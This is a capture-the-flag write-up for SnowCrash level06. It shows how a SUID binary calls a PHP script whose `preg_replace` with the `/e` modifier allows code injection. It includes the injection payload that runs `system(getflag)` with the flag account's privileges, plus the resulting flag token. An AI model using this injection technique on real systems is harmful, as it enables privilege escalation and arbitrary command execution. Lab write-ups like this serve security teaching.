1. **File Search**

    ```bash
    level06@SnowCrash:~$ ll
    [...]
    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
    [...]
    ```  
    File with SUID permissions, we use the `strings` command to search for readable text:
    ```bash
    level06@SnowCrash:~$ strings level06
    [...]
    /home/user/level06/level06.php
    [...]
    ```  
    The executable `level06` appears to be a program that uses `PHP` to execute the file `/home/user/level06/level06.php`. Since it has the `SUID` bit enabled, any action performed by this program will be executed with the privileges of the `flag06` user. This suggests that the PHP file could be key to exploitation. The next step would be to try to read the `level06.php` file to analyze its content and look for vulnerabilities.

2. **Vulnerability**

    ```bash
    level06@SnowCrash:~$ cat /home/user/level06/level06.php
    #!/usr/bin/php
    <?php
    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
    $r = x($argv[1], $argv[2]); print $r;
    ?>
    ``` 
    The file `level06.php` contains PHP code that appears to be vulnerable due to the use of the `preg_replace` function with the `/e` modifier. This modifier allows arbitrary PHP code execution within a regular expression, which can be exploited.
    Code Analysis:
    1. Function `y($m)`:
        - Replaces dots `(.)` with `" x "` and `@` characters with `" y"`.
        - Does not seem dangerous on its own.
    2. Function `x($y, $z)`:
        - Reads the content of a file specified in `$y` using `file_get_contents`.
        - Uses `preg_replace` with the `/e` modifier to execute PHP code within the regular expression.
        - Replaces brackets `[ and ]` with parentheses `( and )`.
    3. Execution:
        - The script takes two command-line arguments `($argv[1] and $argv[2])`.
        - Calls the `x` function with these arguments and displays the result.

3. **Exploitation**

    We create a malicious script that injects PHP code:
    ```bash
    echo '[x {${system(getflag)}}]' > /tmp/exploit
    ```
    Pass the file as an argument to the script:
    ```bash
    level06@SnowCrash:~$ ./level06 /tmp/exploit
    PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
    Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
    ```



